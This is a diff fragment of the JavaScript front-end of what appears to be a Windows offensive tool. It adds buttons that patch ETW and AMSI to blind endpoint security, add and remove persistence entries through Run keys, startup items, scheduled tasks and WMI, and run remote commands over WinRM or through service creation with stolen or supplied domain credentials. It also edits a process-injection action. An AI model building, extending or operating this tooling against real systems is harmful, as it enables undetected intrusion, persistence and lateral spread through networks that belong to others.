+                await window.req('/v1/op/etw', {method:'POST'});
+                window.log('ETW neutered in this process', 'SUCCESS');
+            } catch(e) {
+                window.log('ETW patch blocked: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        window.patchAMSI = async function() {
+            const ok = await window.confirmModal('Neuter AMSI (self)',
+                'Patch the AMSI scan entry point in the tool process (W^X-safe transition, logged). Continue?', 'Patch', true);
+            if (!ok) return;
+            try {
+                await window.req('/v1/op/amsi', {method:'POST'});
+                window.log('AMSI neutered in this process', 'SUCCESS');
+            } catch(e) {
+                window.log('AMSI patch blocked: ' + (e.message || e), 'ERROR');
+            }
+        };
+
         window.exportIntelCSV = function() {
             let csv = [];
             const rows = document.querySelectorAll('#view-intel tr');
@@ -975,6 +1313,142 @@
             window.log('CSV exported', 'SUCCESS');
         };
 
+        /* ---------- pulse: persistence manager ---------- */
+        window._persistBadge = function(type) {
+            const map = { run:'RUN', startup:'STARTUP', task:'TASK', wmi:'WMI' };
+            const colors = { run:'var(--accent)', startup:'var(--green)', task:'var(--amber)', wmi:'var(--red)' };
+            const t = map[type] || String(type || 'run').toUpperCase();
+            return `<span style="font-family:var(--mono); font-size:10.5px; font-weight:700; color:${colors[type] || 'var(--text-2)'};">${window.esc(t)}</span>`;
+        };
+
+        window.loadPersist = async function() {
+            window.showView('pulse');
+            const body = document.getElementById('persist-body');
+            body.innerHTML = '<tr class="empty-row"><td colspan="5">Scanning footholds…</td></tr>';
+            try {
+                const r = await window.req('/v1/sys/persist');
+                const d = await r.json();
+                body.innerHTML = '';
+                if (d.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="5" style="color:var(--green);">No footholds — clean host.</td></tr>';
+                for (const e of d) {
+                    body.innerHTML += `<tr><td>${window._persistBadge(e.type)}</td><td style="font-family:var(--mono); color:var(--accent);">${window.esc(e.hive)}</td><td style="font-weight:600;">${window.esc(e.name)}</td><td style="font-family:var(--mono); font-size:11px; color:var(--text-2);">${window.esc(e.cmd)}</td><td><button class="btn btn-ghost btn-sm" onclick="window.delPersist('${window.esc(e.type)}','${window.esc(e.hive)}','${window.esc(e.name)}')">${window.ICO.trash}</button></td></tr>`;
+                }
+                window.log('Persistence scan done: ' + d.length + ' foothold(s)', 'SUCCESS');
+            } catch(e) {
+                window.log('Persistence blocked: ' + (e.message || e), 'ERROR');
+                body.innerHTML = `<tr class="empty-row"><td colspan="5" style="color:var(--red);">${window.esc(e.message || 'Scan failed')}</td></tr>`;
+            }
+        };
+
+        window.addPersist = async function() {
+            const v = await window.promptModal('Add persistence foothold', [
+                {id:'type', label:'Type (run / startup / task / wmi)', placeholder:'run'},
+                {id:'hive', label:'Hive (run only: HKCU / HKLM)', placeholder:'HKCU'},
+                {id:'name', label:'Entry name', placeholder:'obl-update'},
+                {id:'cmd', label:'Command (what runs)', placeholder:'C:\\tools\\agent.exe --start'},
+                {id:'schedule', label:'Task schedule (ONLOGON / ONSTART / ONCE) — tasks only', placeholder:'ONLOGON'},
+                {id:'start_time', label:'Task start time HH:MM — ONCE only', placeholder:''},
+            ]);
+            if (!v) return;
+            try {
+                await window.req('/v1/op/persist-add', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({type:v.type || 'run', hive:v.hive || 'HKCU', name:v.name, cmd:v.cmd, schedule:v.schedule || '', start_time:v.start_time || ''}),
+                });
+                await window.loadPersist();
+            } catch(e) {
+                window.log('Persistence write blocked: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        window.delPersist = async function(type, hive, name) {
+            const ok = await window.confirmModal('Remove foothold', 'Delete <span class="mono">' + window.esc(type) + ' · ' + window.esc(hive) + ' · ' + window.esc(name) + '</span>?', 'Remove', true);
+            if (!ok) return;
+            try {
+                await window.req('/v1/op/persist-del', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({type:type, hive:hive, name:name}),
+                });
+                await window.loadPersist();
+            } catch(e) {
+                window.log('Persistence removal failed: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        /* ---------- relay: lateral movement ---------- */
+        window._relay = function(line) {
+            const el = document.getElementById('relay-status');
+            if (el) el.innerHTML += line + '<br>';
+        };
+        window._relayReset = function(msg) {
+            const el = document.getElementById('relay-status');
+            if (el) el.textContent = msg;
+        };
+
+        window.lateralWinRM = async function() {
+            const v = await window.promptModal('WinRM exec — remote command', [
+                {id:'host', label:'Target host (name or IP)', placeholder:'10.0.0.5'},
+                {id:'user', label:'Username (DOMAIN\\user)', placeholder:'CORP\\svc-deploy'},
+                {id:'password', label:'Password', placeholder:''},
+                {id:'command', label:'Command to run', placeholder:'whoami /all'},
+                {id:'tls', label:'Use HTTPS (5986)? yes/no', placeholder:'no'},
+                {id:'insecure', label:'Skip TLS verification? yes/no', placeholder:'no'},
+            ]);
+            if (!v) return;
+            window.showView('relay');
+            window._relayReset('[WINRM] ' + v.host + ' — dispatching…');
+            window.log('WinRM exec -> ' + v.host, 'INFO');
+            try {
+                await window.req('/v1/op/lateral-winrm', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({host:v.host, user:v.user, password:v.password, command:v.command,
+                        tls:/^y/i.test(v.tls||''), insecure:/^y/i.test(v.insecure||'')}),
+                });
+            } catch(e) {
+                window.log('WinRM blocked: ' + (e.message || e), 'ERROR');
+                window._relay('<span style="color:var(--red);">' + window.esc(e.message || 'blocked') + '</span>');
+            }
+        };
+
+        window.lateralSCM = async function() {
+            const v = await window.promptModal('SCM exec — remote service', [
+                {id:'host', label:'Target host (name or IP)', placeholder:'10.0.0.5'},
+                {id:'user', label:'Username (DOMAIN\\user)', placeholder:'CORP\\svc-deploy'},
+                {id:'password', label:'Password', placeholder:''},
+                {id:'name', label:'Service name', placeholder:'OblSvc'},
+                {id:'command', label:'Command to run', placeholder:'whoami /all > C:\\Windows\\Temp\\out.txt'},
+            ]);
+            if (!v) return;
+            window.showView('relay');
+            window._relayReset('[SCM] ' + v.host + ' — creating service…');
+            window.log('SCM exec -> ' + v.host, 'INFO');
+            try {
+                await window.req('/v1/op/lateral-scm', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({host:v.host, user:v.user, password:v.password, name:v.name, command:v.command}),
+                });
+            } catch(e) {
+                window.log('SCM blocked: ' + (e.message || e), 'ERROR');
+                window._relay('<span style="color:var(--red);">' + window.esc(e.message || 'blocked') + '</span>');
+            }
+        };
+
+        window._renderLateral = function(d) {
+            const tag = String(d.method || '').toUpperCase();
+            if (d.error) {
+                window._relay(`<span style="color:var(--red);">[${window.esc(tag)}] ${window.esc(d.host)} failed: ${window.esc(d.error)}</span>`);
+                window.log(tag + ' exec failed on ' + d.host, 'ERROR');
+                return;
+            }
+            window._relay(`<span style="color:var(--green);">[${window.esc(tag)}] ${window.esc(d.host)} — done</span>`);
+            if (d.output) {
+                for (const line of String(d.output).split(/\r?\n/)) {
+                    if (line.length) window._relay(window.esc(line));
+                }
+            }
+            window.log(tag + ' exec completed on ' + d.host, 'SUCCESS');
+        };
+
         /* ---------- optimizer ---------- */
         window.applyTweaks = async function() {
             const ok = await window.confirmModal(
@@ -988,11 +1462,11 @@
             try {
                 const r = await window.req('/v1/sys/opt', {method:'POST'});
                 const d = await r.json();
-                d.forEach(x => o.innerHTML += `<div style="color:${String(x).includes('FAIL')?'var(--red)':'var(--green)'}; margin:2px 0;">▸ ${window.esc(x)}</div>`);
+                d.forEach(x => o.innerHTML += `<div style="color:${String(x).includes('FAIL')?'var(--red)':'var(--green)'}; margin:2px 0;">${window.ICO.chev} ${window.esc(x)}</div>`);
                 o.scrollTop = o.scrollHeight;
                 window.log('Optimization complete', 'SUCCESS');
             } catch(e) {
-                o.innerHTML += `<div style="color:var(--red)">▸ FAILED: ${window.esc(e.message || e)}</div>`;
+                o.innerHTML += `<div style="color:var(--red)">${window.ICO.chev} FAILED: ${window.esc(e.message || e)}</div>`;
                 window.log('Optimization failed', 'ERROR');
             }
         };
@@ -1012,14 +1486,14 @@
             );
             if (!ok) return;
             window.log('Injecting pulse into ' + window.selectedPid, 'INFO');
-            document.getElementById('sig-status').innerText = '[DISPATCHING → PID ' + window.selectedPid + ']';
+            document.getElementById('sig-status').innerText = '[DISPATCHING > PID ' + window.selectedPid + ']';
             try {
                 await window.req('/v1/op/d4', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({pid: window.selectedPid})
                 });
-                document.getElementById('sig-status').innerText = '[PULSE_SENT → PID ' + window.selectedPid + ']';
+                document.getElementById('sig-status').innerText = '[PULSE_SENT > PID ' + window.selectedPid + ']';
                 window.log('PULSE_SENT', 'SUCCESS');
             } catch(e) {
                 document.getElementById('sig-status').innerText = '[BLOCKED] ' + (e.message || e);
@@ -1038,7 +1512,7 @@
                 const rep = await r.json();
                 body.innerHTML = '';
                 const sevColor = {CRITICAL:'var(--red)', HIGH:'var(--red)', MEDIUM:'var(--amber)', LOW:'var(--accent)', INFO:'var(--text-2)'};
-                const statMark = {pass:'✔', fail:'✘', unknown:'?'};
+                const statMark = {pass:`<span style="color:var(--green);">${window.ICO.check}</span>`, fail:`<span style="color:var(--red);">${window.ICO.cross}</span>`, unknown:'<span style="color:var(--amber);">?</span>'};
                 for (const f of (rep.findings || [])) {
                     const stColor = f.status === 'fail' ? 'var(--red)' : f.status === 'pass' ? 'var(--green)' : 'var(--amber)';
                     body.innerHTML += `<tr>
